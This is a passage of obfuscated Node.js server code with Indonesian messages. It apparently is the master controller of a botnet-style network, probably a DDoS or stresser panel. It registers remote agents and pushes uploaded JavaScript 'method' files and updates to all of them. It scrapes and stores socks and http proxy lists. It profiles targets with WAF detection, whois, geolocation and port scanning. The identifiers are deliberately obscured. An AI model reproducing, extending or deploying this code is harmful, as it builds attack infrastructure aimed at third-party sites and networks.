Promise[_0x15689f(0x213)](AGENT_LIST[_0x15689f(0x1a1)](_0x6bfc8a=>axios[_0x15689f(0x1a3)](_0x6bfc8a[_0x15689f(0xe5)]+_0x15689f(0x157),{'key':AGENT_KEY,'filename':_0x56cfba})[_0x15689f(0x141)](()=>({'agent':_0x6bfc8a,'status':_0x15689f(0x22d)}))[_0x15689f(0x189)](_0x1b51ff=>({'agent':_0x6bfc8a,'status':_0x15689f(0x134),'error':_0x1b51ff['message']}))));logActivity(_0x15689f(0xb9),{'filename':_0x56cfba,'results':_0x4fb33b});}_0x2dfa19[_0x15689f(0x207)]({'message':'File\x20dihapus','file':_0x56cfba});}),app['get'](_0x214aff(0xad),validateApiKey,validateFileName,(_0x539cec,_0x1c2635)=>{const _0x401a0e=_0x214aff,_0x568047=_0x539cec[_0x401a0e(0x73)][_0x401a0e(0x12f)],_0x59a295=path[_0x401a0e(0x84)](uploadDir,_0x568047);if(!fs['existsSync'](_0x59a295))return _0x1c2635[_0x401a0e(0x23d)](0x194)[_0x401a0e(0x1b9)](_0x401a0e(0x16e));_0x1c2635[_0x401a0e(0x117)](_0x59a295);}),app[_0x214aff(0x1a3)]('/api/method-files/rename',validateApiKey,validateFileName,express[_0x214aff(0x207)](),(_0x403d78,_0x38a134)=>{const _0x1d46ad=_0x214aff,{oldName:_0x5cd926,newName:_0x5f062,key:_0x47f40c}=_0x403d78[_0x1d46ad(0x1f9)];if(!_0x5cd926||!_0x5f062)return _0x38a134['status'](0x190)[_0x1d46ad(0x1b9)](_0x1d46ad(0x238));if(!isValidFileName(_0x5f062))return _0x38a134[_0x1d46ad(0x23d)](0x190)[_0x1d46ad(0x1b9)]('Nama\x20file\x20baru\x20tidak\x20valid');const _0x16f418=path[_0x1d46ad(0x84)](uploadDir,_0x5cd926),_0x113c0e=path[_0x1d46ad(0x84)](uploadDir,_0x5f062);if(!fs[_0x1d46ad(0x18b)](_0x16f418))return _0x38a134['status'](0x194)['send']('File\x20lama\x20tidak\x20ditemukan');if(fs['existsSync'](_0x113c0e))return _0x38a134['status'](0x199)[_0x1d46ad(0x1b9)](_0x1d46ad(0xc5));fs[_0x1d46ad(0x201)](_0x16f418,_0x113c0e),logActivity(_0x1d46ad(0xe2),{'from':_0x5cd926,'to':_0x5f062}),_0x38a134[_0x1d46ad(0x207)]({'message':_0x1d46ad(0xd3),'from':_0x5cd926,'to':_0x5f062});}),app[_0x214aff(0x228)]('/api/method-files/view/:filename',validateApiKey,validateFileName,(_0x2f6845,_0x2554e2)=>{const _0x37a555=_0x214aff,_0x48a8ca=_0x2f6845[_0x37a555(0x73)][_0x37a555(0x12f)],_0x3cb818=path['join'](uploadDir,_0x48a8ca);if(!fs['existsSync'](_0x3cb818))return _0x2554e2[_0x37a555(0x23d)](0x194)[_0x37a555(0x1b9)](_0x37a555(0x16e));_0x2554e2['type'](_0x37a555(0x171))[_0x37a555(0x1b9)](fs[_0x37a555(0x267)](_0x3cb818,'utf8'));}),app[_0x214aff(0x1a3)]('/api/method-files/save/:filename',validateApiKey,validateFileName,express[_0x214aff(0x15a)]({'type':_0x214aff(0xa5),'limit':'5mb'}),async(_0x19493b,_0x1adcaf)=>{const _0x1bd2e2=_0x214aff,_0x1651c4=_0x19493b['params'][_0x1bd2e2(0x12f)],_0x543b6c=path[_0x1bd2e2(0x84)](uploadDir,_0x1651c4);if(!fs[_0x1bd2e2(0x18b)](_0x543b6c))return _0x1adcaf[_0x1bd2e2(0x23d)](0x194)[_0x1bd2e2(0x1b9)]('File\x20tidak\x20ditemukan');fs[_0x1bd2e2(0x14c)](_0x543b6c,_0x19493b[_0x1bd2e2(0x1f9)],_0x1bd2e2(0xf0)),logActivity(_0x1bd2e2(0xac),{'file':_0x1651c4});let _0x5846a8=[];loadAgents(),NODE_TYPE==='master'&&AGENT_LIST&&AGENT_LIST[_0x1bd2e2(0x230)]&&(_0x5846a8=await Promise[_0x1bd2e2(0x213)](AGENT_LIST['map'](_0xbba694=>{const _0x532b21=_0x1bd2e2,_0x376ced=new FormData();return _0x376ced['append'](_0x532b21(0x105),AGENT_KEY),_0x376ced['append'](_0x532b21(0xdb),fs[_0x532b21(0x190)](_0x543b6c),_0x1651c4),axios['post'](_0xbba694[_0x532b21(0xe5)]+_0x532b21(0x1bc),_0x376ced,{'headers':_0x376ced[_0x532b21(0x1e6)](),'timeout':0x3a98})[_0x532b21(0x141)](_0x1357ff=>({'agent':_0xbba694,'status':'success','data':_0x1357ff[_0x532b21(0x95)]}))[_0x532b21(0x189)](_0x220928=>({'agent':_0xbba694,'status':_0x532b21(0x134),'error':_0x220928[_0x532b21(0x139)]}));})),logActivity('SYNC_EDIT_METHOD_FILE',{'filename':_0x1651c4,'syncResults':_0x5846a8})),_0x1adcaf['json']({'message':_0x1bd2e2(0x8c),'file':_0x1651c4,'sync':_0x5846a8});}),app[_0x214aff(0x228)]('/api/agents',validateApiKey,(_0x3291da,_0x3ec18c)=>{loadAgents(),_0x3ec18c['json'](AGENT_LIST);}),app['post']('/api/agents',express[_0x214aff(0x207)](),validateApiKey,(_0x4f8a78,_0x4f5417)=>{const _0x169e44=_0x214aff,{name:_0x58de96,url:_0xe37808,tags:tags=[]}=_0x4f8a78['body'];if(!_0x58de96||!_0xe37808)return _0x4f5417[_0x169e44(0x23d)](0x190)[_0x169e44(0x1b9)](_0x169e44(0xce));loadAgents();if(AGENT_LIST[_0x169e44(0x79)](_0x3b7e5d=>_0x3b7e5d['name']===_0x58de96))return _0x4f5417[_0x169e44(0x23d)](0x190)[_0x169e44(0x1b9)](_0x169e44(0xcc));const _0x29dc7c={'name':_0x58de96,'url':_0xe37808,'enabled':!![],'tags':tags};AGENT_LIST[_0x169e44(0x113)](_0x29dc7c),saveAgents(),logActivity(_0x169e44(0x252),_0x29dc7c),_0x4f5417['json']({'message':'Agent\x20ditambahkan','agent':_0x29dc7c});}),app[_0x214aff(0x17d)](_0x214aff(0xd8),express[_0x214aff(0x207)](),validateApiKey,(_0x5b67be,_0xf34e22)=>{const _0x5a7250=_0x214aff,_0x2e3563=_0x5b67be[_0x5a7250(0x73)][_0x5a7250(0x1c5)],{url:_0x41e994,enabled:_0x2da864,tags:_0x2c7444}=_0x5b67be[_0x5a7250(0x1f9)];loadAgents();const _0x42a26c=AGENT_LIST['findIndex'](_0x562865=>_0x562865[_0x5a7250(0x1c5)]===_0x2e3563);if(_0x42a26c===-0x1)return _0xf34e22['status'](0x194)[_0x5a7250(0x207)]({'error':'Agent\x20tidak\x20ditemukan'});if(_0x41e994)AGENT_LIST[_0x42a26c][_0x5a7250(0xe5)]=_0x41e994;if(typeof _0x2da864===_0x5a7250(0x256))AGENT_LIST[_0x42a26c][_0x5a7250(0x233)]=_0x2da864;if(Array[_0x5a7250(0x1dd)](_0x2c7444))AGENT_LIST[_0x42a26c][_0x5a7250(0x1e0)]=_0x2c7444;saveAgents(),_0xf34e22[_0x5a7250(0x207)]({'message':_0x5a7250(0xfe)});}),app[_0x214aff(0x9c)]('/api/agents/:name',validateApiKey,(_0x2c4d5f,_0x416576)=>{const _0x368de2=_0x214aff,_0x7de9b9=_0x2c4d5f['params'][_0x368de2(0x1c5)];loadAgents();const _0x7f4e1e=AGENT_LIST[_0x368de2(0x1bf)](_0x2a695b=>_0x2a695b[_0x368de2(0x1c5)]===_0x7de9b9);if(_0x7f4e1e===-0x1)return _0x416576['status'](0x194)[_0x368de2(0x1b9)](_0x368de2(0x1f2));const _0x46b08=AGENT_LIST['splice'](_0x7f4e1e,0x1)[0x0];saveAgents(),logActivity(_0x368de2(0x1ac),_0x46b08),_0x416576[_0x368de2(0x207)]({'message':'Agent\x20dihapus','agent':_0x46b08});}),app[_0x214aff(0x1a3)](_0x214aff(0x262),express['json'](),(_0x3b3fec,_0x3e8f6f)=>{const _0x7698d=_0x214aff;if(NODE_TYPE!==_0x7698d(0x21e))return _0x3e8f6f[_0x7698d(0x23d)](0x193)[_0x7698d(0x1b9)](_0x7698d(0xda));const {name:_0x193558,url:_0x34c932,agentKey:_0x129aa3,fingerprint:_0x2e807c}=_0x3b3fec[_0x7698d(0x1f9)];if(!_0x193558||!_0x34c932||!_0x2e807c||_0x129aa3!==AGENT_KEY)return _0x3e8f6f['status'](0x190)[_0x7698d(0x1b9)](_0x7698d(0x247));loadAgents();const _0x42b2d4=AGENT_LIST[_0x7698d(0x22a)](_0x1a034a=>_0x1a034a[_0x7698d(0x209)]===_0x2e807c);if(_0x42b2d4)return _0x42b2d4[_0x7698d(0xe5)]!==_0x34c932&&(_0x42b2d4[_0x7698d(0xe5)]=_0x34c932,logActivity('AGENT_URL_UPDATED',{'name':_0x42b2d4['name'],'newUrl':_0x34c932}),saveAgents()),_0x3e8f6f[_0x7698d(0x207)]({'message':_0x7698d(0xaa),'agent':_0x42b2d4});const _0x5e369e={'name':_0x193558,'url':_0x34c932,'fingerprint':_0x2e807c,'enabled':!![],'auto':!![],'registeredAt':new Date()[_0x7698d(0x184)]()};AGENT_LIST['push'](_0x5e369e),saveAgents(),logActivity(_0x7698d(0xf9),_0x5e369e),_0x3e8f6f[_0x7698d(0x207)]({'message':_0x7698d(0x147),'agent':_0x5e369e});}),app[_0x214aff(0x228)]('/api/scrape-proxies',validateApiKey,async(_0x1e990a,_0x45f21e)=>{const _0x1a17df=_0x214aff,_0xeba6b2=_0x1e990a[_0x1a17df(0x123)][_0x1a17df(0x105)],_0x56a5cb=(_0x1e990a[_0x1a17df(0x123)]['protocols']||'http,https,socks4,socks5')[_0x1a17df(0x1ec)](',')['map'](_0xffccb3=>_0xffccb3['trim']()[_0x1a17df(0x19c)]())['filter'](Boolean),_0x1294a7=_0x1e990a[_0x1a17df(0x123)][_0x1a17df(0x17f)]||_0x1a17df(0x1d0);try{const {proxies:_0x513234,stats:_0x2f5d82}=await scrapeProxy({'protocols':_0x56a5cb,'country':_0x1294a7}),_0x52ea5d=path['join'](__dirname,_0x1a17df(0x16c));fs['writeFileSync'](_0x52ea5d,_0x513234[_0x1a17df(0x84)]('\x0a'),_0x1a17df(0xf0)),logActivity('PROXY_SCRAPE_SAVED',{'total':_0x513234['length'],'protocols':_0x56a5cb,'savedTo':_0x1a17df(0x16c)}),_0x45f21e[_0x1a17df(0x207)]({'message':_0x1a17df(0x20c),'total':_0x2f5d82['total'],'byProto':_0x2f5d82[_0x1a17df(0x242)],'example':_0x513234[_0x1a17df(0x7c)](0x0,0x5)});}catch(_0x440058){logActivity('SCRAPE_PROXY_ERROR',{'error':_0x440058['message']}),_0x45f21e[_0x1a17df(0x23d)](0x1f4)['json']({'error':_0x440058['message']||_0x440058['toString']()});}}),app[_0x214aff(0x1a3)]('/api/update-proxy',validateApiKey,upload['single'](_0x214aff(0xdb)),(_0x4846fc,_0x346934)=>{const _0x32591a=_0x214aff,_0x3cab93=_0x4846fc[_0x32591a(0x123)][_0x32591a(0x105)]||_0x4846fc['body'][_0x32591a(0x105)];if(!_0x4846fc[_0x32591a(0xdb)])return _0x346934[_0x32591a(0x23d)](0x190)[_0x32591a(0x1b9)]('Tidak\x20ada\x20file\x20proxy\x20ter-upload');const _0x56afe0=_0x4846fc[_0x32591a(0xdb)][_0x32591a(0xdd)],_0x39318f=fs[_0x32591a(0x267)](_0x56afe0,'utf8'),_0x85e886=_0x39318f[_0x32591a(0x1ec)](/\r?\n/)[_0x32591a(0x15d)](Boolean),_0x1bb15f=_0x85e886[_0x32591a(0x15d)](_0xefa9e5=>/^((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d):([1-9][0-9]{1,4})$/[_0x32591a(0xe9)](_0xefa9e5[_0x32591a(0x1a7)]()));if(_0x1bb15f['length']<0x5)return fs[_0x32591a(0x1ad)](_0x56afe0),_0x346934[_0x32591a(0x23d)](0x190)[_0x32591a(0x207)]({'error':_0x32591a(0x93)});const _0x5b6d13=path[_0x32591a(0x84)](__dirname,'proxy.txt');fs[_0x32591a(0x14c)](_0x5b6d13,_0x1bb15f[_0x32591a(0x84)]('\x0a'),'utf8'),fs[_0x32591a(0x1ad)](_0x56afe0),logActivity(_0x32591a(0x20d),{'total':_0x85e886[_0x32591a(0x230)],'valid':_0x1bb15f[_0x32591a(0x230)]}),_0x346934['json']({'message':'proxy.txt\x20berhasil\x20di-update','total':_0x85e886[_0x32591a(0x230)],'valid':_0x1bb15f['length']});}),app[_0x214aff(0x228)](_0x214aff(0x1a2),(_0x2e3395,_0xd28d7d)=>{const _0x5d832a=_0x214aff;_0xd28d7d[_0x5d832a(0x207)]({'status':_0x5d832a(0x98),'uptime':process[_0x5d832a(0x23c)](),'cpu':os[_0x5d832a(0x109)]()[0x0],'memory':Math['round'](process['memoryUsage']()[_0x5d832a(0x108)]/0x400/0x400),'totalMemory':Math[_0x5d832a(0xa1)](os[_0x5d832a(0xf3)]()/0x400/0x400),'hostname':os[_0x5d832a(0xe0)]()});}),app[_0x214aff(0x228)](_0x214aff(0xcb),validateApiKey,async(_0x42403b,_0x344e24)=>{const _0x4efdbe=_0x214aff,_0x1a1761=_0x42403b['query'][_0x4efdbe(0x105)];loadAgents();const _0x514ec9=[];for(const _0x4d6988 of AGENT_LIST){if(!_0x4d6988['enabled'])continue;try{const _0x481d9d=Date[_0x4efdbe(0xb8)](),_0x479d6c=await axios[_0x4efdbe(0x228)](_0x4d6988[_0x4efdbe(0xe5)]+_0x4efdbe(0x1a2),{'timeout':0x7530}),_0x10af47=Date['now']()-_0x481d9d;_0x514ec9['push']({'agent':_0x4d6988,'status':_0x4efdbe(0x22d),'data':{..._0x479d6c[_0x4efdbe(0x95)],'ping':_0x10af47}});}catch(_0xa349e6){_0x514ec9[_0x4efdbe(0x113)]({'agent':_0x4d6988,'status':'error','error':_0xa349e6[_0x4efdbe(0x139)]}),_0x4d6988[_0x4efdbe(0x233)]=![],logActivity('AGENT_DISABLED',{'agent':_0x4d6988}),saveAgents();}}_0x344e24[_0x4efdbe(0x207)](_0x514ec9),broadcastWS({'type':_0x4efdbe(0xef),'agents':_0x514ec9});}),setInterval(async()=>{const _0x353dd3=_0x214aff;try{loadAgents();const _0x457b42=Date['now']();let _0x51c7a9=![];const _0xd4ca85=[];for(let _0x5d31b3=0x0;_0x5d31b3<AGENT_LIST[_0x353dd3(0x230)];_0x5d31b3++){const _0x4193fc=AGENT_LIST[_0x5d31b3];if(!_0x4193fc)continue;let _0x456afc=![];for(let _0x54a882=0x0;_0x54a882<0x3;_0x54a882++){try{await axios[_0x353dd3(0x228)](_0x4193fc[_0x353dd3(0xe5)]+_0x353dd3(0x1a2),{'timeout':0x7530}),_0x456afc=!![];break;}catch(_0x470f60){if(_0x54a882<0x2)await new Promise(_0x5f05e1=>setTimeout(_0x5f05e1,0x3e8));}}if(_0x456afc){if(!_0x4193fc[_0x353dd3(0x233)]){_0x4193fc[_0x353dd3(0x233)]=!![],logActivity(_0x353dd3(0x148),{'agent':_0x4193fc}),broadcastWS({'type':_0x353dd3(0x12c),'agent':_0x4193fc});try{saveAgents();}catch(_0x15bf0d){logActivity('SAVE_AGENTS_ERROR',{'error':_0x15bf0d['message']});}}_0x4193fc['lastOnline']=_0x457b42;}else{_0x4193fc[_0x353dd3(0x233)]&&(_0x4193fc[_0x353dd3(0x233)]=![],_0x51c7a9=!![],logActivity(_0x353dd3(0x1e7),{'agent':_0x4193fc}),broadcastWS({'type':'agent_status_update','agent':_0x4193fc}));if(!_0x4193fc[_0x353dd3(0x26d)])_0x4193fc[_0x353dd3(0x26d)]=0x0;_0x457b42-_0x4193fc[_0x353dd3(0x26d)]>0x3*0x3c*0x3e8&&(AUTO_DELETE_AGENT?(logActivity(_0x353dd3(0x270),{'agent':_0x4193fc,'reason':_0x353dd3(0xd5)}),broadcastWS({'type':_0x353dd3(0x1e9),'agent':_0x4193fc}),_0xd4ca85['push'](_0x5d31b3),_0x51c7a9=!![]):_0x4193fc[_0x353dd3(0x233)]!==![]&&(_0x4193fc[_0x353dd3(0x233)]=![],logActivity('AGENT_MARKED_OFFLINE',{'agent':_0x4193fc,'reason':'Offline\x20>\x203\x20menit'}),broadcastWS({'type':_0x353dd3(0x12c),'agent':_0x4193fc}),_0x51c7a9=!![]));}}for(let _0xfe9310=_0xd4ca85['length']-0x1;_0xfe9310>=0x0;_0xfe9310--){AGENT_LIST[_0x353dd3(0x15b)](_0xd4ca85[_0xfe9310],0x1);}if(_0x51c7a9)try{saveAgents();}catch(_0x82abe8){logActivity('SAVE_AGENTS_ERROR',{'error':_0x82abe8[_0x353dd3(0x139)]});}}catch(_0x5dc165){logActivity(_0x353dd3(0x236),{'error':_0x5dc165?.[_0x353dd3(0x139)]||String(_0x5dc165)}),console[_0x353dd3(0x251)](_0x353dd3(0xe3),_0x5dc165?.['message']||_0x5dc165);}},0xbb8),app[_0x214aff(0x228)]('/api/hostcheck',validateApiKey,async(_0x5397c3,_0x19fd6d)=>{const _0xc15e82=_0x214aff,_0x7aa3cd=_0x5397c3[_0xc15e82(0x123)][_0xc15e82(0x105)],_0x112ce3=_0x5397c3[_0xc15e82(0x123)][_0xc15e82(0xfd)];if(!_0x112ce3)return _0x19fd6d[_0xc15e82(0x23d)](0x190)[_0xc15e82(0x1b9)](_0xc15e82(0x274));try{let _0x5c7c48=_0x112ce3;if(!/^https?:\/\//i['test'](_0x112ce3))_0x5c7c48=_0xc15e82(0xec)+_0x112ce3;const _0x582ab5=new URL(_0x5c7c48),_0x5e5aa4=_0x582ab5[_0xc15e82(0xe0)];let _0x1645f9='';try{const _0x1685f2=await dns[_0xc15e82(0x102)](_0x5e5aa4);_0x1645f9=_0x1685f2[_0xc15e82(0x161)];}catch(_0x49e627){_0x1645f9=_0x5e5aa4;}let _0x4360b2=![],_0x2d27ad=null,_0xca9abc=null;try{const _0x3c527f=Date[_0xc15e82(0xb8)](),_0x49496c=new AbortController(),_0x4f7b65=setTimeout(()=>_0x49496c[_0xc15e82(0x197)](),0x1388),_0x457f4b=await fetch(_0x5c7c48,{'signal':_0x49496c['signal']});clearTimeout(_0x4f7b65),_0x2d27ad=Date['now']()-_0x3c527f,_0x457f4b['ok']||_0x457f4b[_0xc15e82(0x23d)]>=0xc8&&_0x457f4b[_0xc15e82(0x23d)]<0x1f4?_0x4360b2=!![]:_0xca9abc=_0x457f4b[_0xc15e82(0x23d)];}catch(_0x532472){_0x2d27ad=null,_0xca9abc=_0x532472[_0xc15e82(0x1c5)]==='AbortError'?_0xc15e82(0x229):_0x532472[_0xc15e82(0x1d2)]||_0x532472['message']||_0xc15e82(0x1e1);}const _0x212c94=await fetch(_0xc15e82(0x263)+_0x1645f9),_0x49d03f=await _0x212c94[_0xc15e82(0x207)]();return _0x19fd6d[_0xc15e82(0x207)]({'status':_0x4360b2?_0xc15e82(0x98):'offline','latency':_0x2d27ad,'errorCode':_0x4360b2?null:_0xca9abc,'ip':_0x49d03f['ip']||_0x1645f9,'asn':_0x49d03f[_0xc15e82(0xbe)]?.[_0xc15e82(0x21b)]||null,'org':_0x49d03f['connection']?.['org']||null,'isp':_0x49d03f[_0xc15e82(0xbe)]?.[_0xc15e82(0xcf)]||null,'country':_0x49d03f[_0xc15e82(0x17f)]||null,'region':_0x49d03f['region']||null,'city':_0x49d03f['city']||null,'latitude':_0x49d03f['latitude']||null,'longitude':_0x49d03f[_0xc15e82(0x21a)]||null});}catch(_0x3ab0b4){return _0x19fd6d[_0xc15e82(0x23d)](0x1f4)[_0xc15e82(0x207)]({'error':_0xc15e82(0x1a4),'detail':_0x3ab0b4[_0xc15e82(0x139)]});}}),app[_0x214aff(0x228)](_0x214aff(0x122),validateApiKey,async(_0x37692c,_0x2c0b3c)=>{const _0x1a0914=_0x214aff,_0x114f4c=_0x37692c[_0x1a0914(0x123)]['key'],_0x5e107e=_0x37692c['query'][_0x1a0914(0x254)];if(!_0x5e107e)return _0x2c0b3c[_0x1a0914(0x23d)](0x190)[_0x1a0914(0x1b9)](_0x1a0914(0xe1));try{const _0x442d52={'target':_0x5e107e,'urlInfo':{},'dnsInfo':{},'wafDetection':null,'whois':{},'geo':{},'openPorts':[],'error':null},_0x1b184a=/^https?:\/\//[_0x1a0914(0xe9)](_0x5e107e)?_0x5e107e:_0x1a0914(0xec)+_0x5e107e,_0x3c6fd3=new URL(_0x1b184a),_0x4cb043=_0x3c6fd3['hostname'];try{const _0x263438=await dns['lookup'](_0x4cb043);_0x442d52[_0x1a0914(0xc7)]['ip']=_0x263438['address'];}catch(_0x7d6ad0){_0x442d52[_0x1a0914(0xc7)]['ip']=null;}try{const _0x360a97=new AbortController(),_0x4da818=setTimeout(()=>_0x360a97[_0x1a0914(0x197)](),0x1388),_0x80995a=await fetch(_0x1b184a,{'method':_0x1a0914(0x175),'signal':_0x360a97[_0x1a0914(0x191)]});clearTimeout(_0x4da818);const _0x391956={};_0x80995a['headers'][_0x1a0914(0x1cb)]((_0x3b8f1b,_0x419787)=>_0x391956[_0x419787[_0x1a0914(0x19c)]()]=_0x3b8f1b),_0x442d52[_0x1a0914(0xc4)][_0x1a0914(0x78)]=_0x391956,_0x442d52['urlInfo']['status']=_0x80995a[_0x1a0914(0x23d)],_0x442d52['urlInfo']['server']=_0x391956[_0x1a0914(0x1ff)]||null,_0x442d52[_0x1a0914(0xc4)]['poweredBy']=_0x391956[_0x1a0914(0xfc)]||null;if(_0x391956[_0x1a0914(0x1ff)]?.[_0x1a0914(0x19c)]()['includes'](_0x1a0914(0x217))||_0x391956[_0x1a0914(0x221)])_0x442d52[_0x1a0914(0xb3)]='Cloudflare';else{if(_0x391956[_0x1a0914(0x204)])_0x442d52[_0x1a0914(0xb3)]='Sucuri';else{if(_0x391956[_0x1a0914(0x1a6)])_0x442d52[_0x1a0914(0xb3)]=_0x1a0914(0x11a);else _0x391956['x-cdn']&&(_0x442d52[_0x1a0914(0xb3)]=_0x1a0914(0x226)+_0x391956[_0x1a0914(0x1f0)]);}}}catch(_0x46fa88){_0x442d52[_0x1a0914(0xc4)][_0x1a0914(0x251)]='Gagal\x20ambil\x20header:\x20'+_0x46fa88[_0x1a0914(0x139)];}try{const _0x2636e0=await whois(_0x4cb043);_0x442d52[_0x1a0914(0x24d)]={'asn':_0x2636e0['asn']||_0x2636e0[_0x1a0914(0x259)]||null,'org':_0x2636e0[_0x1a0914(0x1d8)]||_0x2636e0['OrgName']||null,'country':_0x2636e0['country']||_0x2636e0[_0x1a0914(0x1e4)]||null};}catch(_0x2f4642){_0x442d52[_0x1a0914(0x24d)]={'error':_0x2f4642[_0x1a0914(0x139)]};}try{if(_0x442d52['dnsInfo']['ip']){const _0x5c7618=await fetch(_0x1a0914(0x263)+_0x442d52[_0x1a0914(0xc7)]['ip']),_0x2c349e=await _0x5c7618[_0x1a0914(0x207)]();_0x442d52[_0x1a0914(0x8b)]={'asn':_0x2c349e[_0x1a0914(0xbe)]?.[_0x1a0914(0x21b)],'org':_0x2c349e[_0x1a0914(0xbe)]?.[_0x1a0914(0x1d8)],'isp':_0x2c349e[_0x1a0914(0xbe)]?.[_0x1a0914(0xcf)],'country':_0x2c349e['country'],'city':_0x2c349e['city'],'region':_0x2c349e['region']};}}catch(_0x54bd31){_0x442d52[_0x1a0914(0x8b)]={'error':_0x54bd31[_0x1a0914(0x139)]};}if(_0x442d52['dnsInfo']['ip'])try{_0x442d52[_0x1a0914(0x14a)]=await scanCommonPorts(_0x442d52[_0x1a0914(0xc7)]['ip']);}catch(_0x51a0d2){_0x442d52['openPortsError']=_0x51a0d2[_0x1a0914(0x139)];}_0x2c0b3c[_0x1a0914(0x207)](_0x442d52);}catch(_0x40d87f){_0x2c0b3c['status'](0x1f4)[_0x1a0914(0x207)]({'error':_0x1a0914(0x140),'detail':_0x40d87f[_0x1a0914(0x139)]});}}),app[_0x214aff(0x228)](_0x214aff(0xa6),validateApiKey,(_0x358166,_0x1ed36a)=>{const _0x1fdc0b=_0x214aff,_0x4eee4a=path[_0x1fdc0b(0x84)](__dirname,_0x1fdc0b(0x240));if(!fs[_0x1fdc0b(0x18b)](_0x4eee4a))return _0x1ed36a[_0x1fdc0b(0x1b9)]('');_0x1ed36a[_0x1fdc0b(0x149)]('Content-Type',_0x1fdc0b(0x171))[_0x1fdc0b(0x1b9)](fs[_0x1fdc0b(0x267)](_0x4eee4a,_0x1fdc0b(0xf0)));}),app[_0x214aff(0x9c)]('/api/activity-log',validateApiKey,(_0xa6fa98,_0x144854)=>{const _0x5e4f95=_0x214aff,_0x3c0ea6=path[_0x5e4f95(0x84)](__dirname,_0x5e4f95(0x240));fs[_0x5e4f95(0x14c)](_0x3c0ea6,''),_0x144854[_0x5e4f95(0x1b9)]('Log\x20cleared');}),app['post'](_0x214aff(0x157),express[_0x214aff(0x207)](),validateApiKey,(_0x1f1df5,_0x2d9fce)=>{const _0x3234c7=_0x214aff;loadAgents();const _0x43dbe6=_0x1f1df5[_0x3234c7(0x1f9)],{filename:_0x3e5fc3}=_0x43dbe6;if(!_0x3e5fc3)return _0x2d9fce[_0x3234c7(0x23d)](0x190)[_0x3234c7(0x1b9)](_0x3234c7(0x258));const _0x3dd959=path[_0x3234c7(0x84)](uploadDir,_0x3e5fc3);if(!fs['existsSync'](_0x3dd959))return _0x2d9fce['json']({'message':_0x3234c7(0x14d)});fs[_0x3234c7(0x1ad)](_0x3dd959),logActivity(_0x3234c7(0x24a),{'file':_0x3e5fc3}),_0x2d9fce[_0x3234c7(0x207)]({'message':'File\x20dihapus\x20di\x20agent','file':_0x3e5fc3});}),app[_0x214aff(0x1a3)](_0x214aff(0x1bc),validateApiKey,upload[_0x214aff(0xb5)](_0x214aff(0xdb)),async(_0x580f4f,_0x53154a)=>{const _0x127a61=_0x214aff,_0x3cef5a=_0x580f4f['query'][_0x127a61(0x105)]||_0x580f4f['body'][_0x127a61(0x105)];if(!_0x580f4f['file'])return _0x53154a[_0x127a61(0x23d)](0x190)['send'](_0x127a61(0x212));const _0x4ab514=['.js',_0x127a61(0xb1)],_0x3b8312=path['extname'](_0x580f4f[_0x127a61(0xdb)][_0x127a61(0x1e5)])[_0x127a61(0x19c)]();if(!fs[_0x127a61(0x18b)](uploadDir))fs[_0x127a61(0xb6)](uploadDir,{'recursive':!![]});let _0x3a7ca1=![];if(_0x4ab514[_0x127a61(0x195)](_0x3b8312)){const _0x2abce4=path[_0x127a61(0x84)](uploadDir,_0x580f4f[_0x127a61(0xdb)][_0x127a61(0x1e5)]);fs[_0x127a61(0x201)](_0x580f4f[_0x127a61(0xdb)][_0x127a61(0xdd)],_0x2abce4),_0x3a7ca1=!![],logActivity('RECEIVE_UPDATE_MOVE',{'file':_0x580f4f['file'][_0x127a61(0x1e5)],'size':_0x580f4f[_0x127a61(0xdb)][_0x127a61(0xf8)]});}else _0x3a7ca1=![],logActivity(_0x127a61(0x26e),{'file':_0x580f4f[_0x127a61(0xdb)]['originalname'],'size':_0x580f4f[_0x127a61(0xdb)][_0x127a61(0xf8)]});let _0x4a62a0=null;if(NODE_TYPE===_0x127a61(0x269))try{const {data:_0x18457a}=await axios[_0x127a61(0x228)](MASTER_URL+_0x127a61(0x199),{'params':{'key':AGENT_KEY},'timeout':0x3a98});writeMethods(_0x18457a),_0x4a62a0={'success':!![],'source':MASTER_URL,'methodsCount':Object[_0x127a61(0x178)](_0x18457a)['length']},logActivity(_0x127a61(0x104),{'from':MASTER_URL,'size':Object[_0x127a61(0x178)](_0x18457a)['length']});}catch(_0x1c8fca){_0x4a62a0={'success':![],'error':_0x1c8fca['message'],'source':MASTER_URL},logActivity(_0x127a61(0x225),{'from':MASTER_URL,'error':_0x1c8fca[_0x127a61(0x139)]});}_0x53154a[_0x127a61(0x207)]({'message':_0x127a61(0xbf),'file':_0x580f4f['file'][_0x127a61(0x1e5)],'moved':_0x3a7ca1,'mode':NODE_TYPE,'sync':_0x4a62a0});}),app[_0x214aff(0x1a3)]('/api/agent/update',validateApiKey,upload[_0x214aff(0xb5)](_0x214aff(0xdb)),async(_0x47ea08,_0x7f69cf)=>{const _0x4a3b10=_0x214aff,_0x24dc3e=_0x47ea08['query']['key']||_0x47ea08[_0x4a3b10(0x1f9)][_0x4a3b10(0x105)];if(!_0x47ea08[_0x4a3b10(0xdb)])return _0x7f69cf[_0x4a3b10(0x23d)](0x190)[_0x4a3b10(0x1b9)](_0x4a3b10(0x212));loadAgents();const _0x13843d=await Promise[_0x4a3b10(0x213)](AGENT_LIST[_0x4a3b10(0x1a1)](_0x171f51=>{const _0x36febd=_0x4a3b10,_0x3b7ce2=new FormData();return _0x3b7ce2[_0x36febd(0x96)](_0x36febd(0x105),AGENT_KEY),_0x3b7ce2[_0x36febd(0x96)](_0x36febd(0xdb),fs[_0x36febd(0x190)](_0x47ea08[_0x36febd(0xdb)][_0x36febd(0xdd)]),_0x47ea08[_0x36febd(0xdb)][_0x36febd(0x1e5)]),axios[_0x36febd(0x1a3)](_0x171f51['url']+_0x36febd(0x1bc),_0x3b7ce2,{'headers':_0x3b7ce2['getHeaders'](),'timeout':0x3a98})[_0x36febd(0x141)](_0x4eac03=>({'agent':_0x171f51,'status':_0x36febd(0x22d),'data':_0x4eac03['data']}))[_0x36febd(0x189)](_0x5d0209=>({'agent':_0x171f51,'status':_0x36febd(0x134),'error':_0x5d0209[_0x36febd(0x139)]}));}));logActivity('PUSH_UPDATE',{'file':_0x47ea08['file'][_0x4a3b10(0x12f)],'results':_0x13843d}),broadcastWS({'type':_0x4a3b10(0x1f3),'results':_0x13843d,'file':_0x47ea08[_0x4a3b10(0xdb)][_0x4a3b10(0x12f)]}),_0x7f69cf[_0x4a3b10(0x207)]({'message':_0x4a3b10(0x128),'results':_0x13843d});}),app[_0x214aff(0x228)](_0x214aff(0x16f),(_0x36e3e9,